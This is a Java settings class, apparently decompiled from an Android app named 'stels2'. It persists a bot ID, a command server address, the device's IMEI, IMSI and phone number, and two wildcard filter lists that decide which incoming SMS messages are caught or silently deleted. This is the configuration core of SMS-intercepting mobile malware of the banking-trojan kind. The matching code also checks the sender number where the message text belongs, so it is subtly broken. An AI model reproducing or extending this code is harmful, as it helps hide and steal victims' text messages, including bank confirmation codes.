package ru.stels2;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import java.util.Vector;
import org.json.JSONArray;
import org.json.JSONObject;

public class Settings {
    private static String SETTINGS = "stelsSettings";
    static Settings settings;
    public String botId = "";
    public Vector<SmsItem> catchSmsList = new Vector();
    public Vector<SmsItem> deleteSmsList = new Vector();
    public String imei = "";
    public String imsi = "";
    public int period = 0;
    public String phone = "";
    public String server = "";
    public String sid = "";
    public int startPeriod = 0;
    public String subPref = "";
    public long timeNextConnection = 0;
    public String version = "";

    public boolean load(Context context) {
        this.imei = Functions.getImei(context);
        this.imsi = Functions.getImsi(context);
        this.phone = Functions.getPhone(context);
        try {
            SharedPreferences sharedPreferences = context.getSharedPreferences(SETTINGS, 1);
            if (!sharedPreferences.contains("first")) {
                return false;
            }
            int i;
            JSONObject jsonObject;
            this.sid = sharedPreferences.getString("sid", "");
            this.version = sharedPreferences.getString("version", "");
            this.server = sharedPreferences.getString("server", "");
            this.startPeriod = sharedPreferences.getInt("startPeriod", 0);
            this.period = sharedPreferences.getInt("period", 0);
            this.timeNextConnection = sharedPreferences.getLong("timeNextConnection", 0);
            this.subPref = sharedPreferences.getString("subPref", "");
            this.botId = sharedPreferences.getString("botId", "");
            this.deleteSmsList = new Vector();
            JSONArray jsonArray = new JSONArray(sharedPreferences.getString("deleteSms", ""));
            for (i = 0; i < jsonArray.length(); i++) {
                jsonObject = jsonArray.getJSONObject(i);
                this.deleteSmsList.add(new SmsItem(jsonObject.getString("phone"), jsonObject.getString("text")));
            }
            this.catchSmsList = new Vector();
            jsonArray = new JSONArray(sharedPreferences.getString("catchSms", ""));
            for (i = 0; i < jsonArray.length(); i++) {
                jsonObject = jsonArray.getJSONObject(i);
                this.catchSmsList.add(new SmsItem(jsonObject.getString("phone"), jsonObject.getString("text")));
            }
            return true;
        } catch (Exception ex) {
            ex.printStackTrace();
            return false;
        }
    }

    public boolean save(Context context) {
        try {
            int i;
            SmsItem item;
            JSONObject jsonObject;
            Editor editor = context.getSharedPreferences(SETTINGS, 2).edit();
            editor.putBoolean("first", false);
            editor.putString("sid", this.sid);
            editor.putString("version", this.version);
            editor.putString("server", this.server);
            editor.putInt("startPeriod", this.startPeriod);
            editor.putInt("period", this.period);
            editor.putLong("timeNextConnection", this.timeNextConnection);
            editor.putString("subPref", this.subPref);
            editor.putString("botId", this.botId);
            JSONArray jsonArray = new JSONArray();
            for (i = 0; i < this.deleteSmsList.size(); i++) {
                item = (SmsItem) this.deleteSmsList.get(i);
                jsonObject = new JSONObject();
                jsonObject.put("phone", item.number);
                jsonObject.put("text", item.text);
                jsonArray.put(jsonObject);
            }
            editor.putString("deleteSms", jsonArray.toString());
            jsonArray = new JSONArray();
            for (i = 0; i < this.catchSmsList.size(); i++) {
                item = (SmsItem) this.catchSmsList.get(i);
                jsonObject = new JSONObject();
                jsonObject.put("phone", item.number);
                jsonObject.put("text", item.text);
                jsonArray.put(jsonObject);
            }
            editor.putString("catchSms", jsonArray.toString());
            editor.commit();
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return false;
    }

    public void reset(Context context) {
        try {
            Editor editor = context.getSharedPreferences(SETTINGS, 2).edit();
            editor.clear();
            editor.commit();
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void setSettings(Settings set) {
        settings = set;
    }

    public static Settings getSettings() {
        return settings;
    }

    public void removeCatchFilter(long key) {
        for (int i = 0; i < this.catchSmsList.size(); i++) {
            if (((SmsItem) this.catchSmsList.get(i)).key == key) {
                this.catchSmsList.remove(i);
                return;
            }
        }
    }

    public boolean isDeleteMessage(String number, String text) {
        int i = 0;
        while (i < this.deleteSmsList.size()) {
            try {
                SmsItem item = (SmsItem) this.deleteSmsList.get(i);
                item.number = item.number.toLowerCase();
                item.text = item.text.toLowerCase();
                number = number.toLowerCase();
                text = text.toLowerCase();
                WildCardStringFinder finderNumber = new WildCardStringFinder();
                WildCardStringFinder finderText = new WildCardStringFinder();
                if (finderNumber.isStringMatching(number, item.number) && finderText.isStringMatching(number, item.text)) {
                    return true;
                }
                i++;
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
        return false;
    }

    public CatchResult isCatchMessage(String number, String text) {
        int i = 0;
        while (i < this.catchSmsList.size()) {
            try {
                SmsItem item = (SmsItem) this.catchSmsList.get(i);
                item.number = item.number.toLowerCase();
                item.text = item.text.toLowerCase();
                number = number.toLowerCase();
                text = text.toLowerCase();
                WildCardStringFinder finderNumber = new WildCardStringFinder();
                WildCardStringFinder finderText = new WildCardStringFinder();
                if (finderNumber.isStringMatching(number, item.number) && finderText.isStringMatching(number, item.text)) {
                    return new CatchResult(true, item.key);
                }
                i++;
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
        return new CatchResult(false, 0);
    }
}
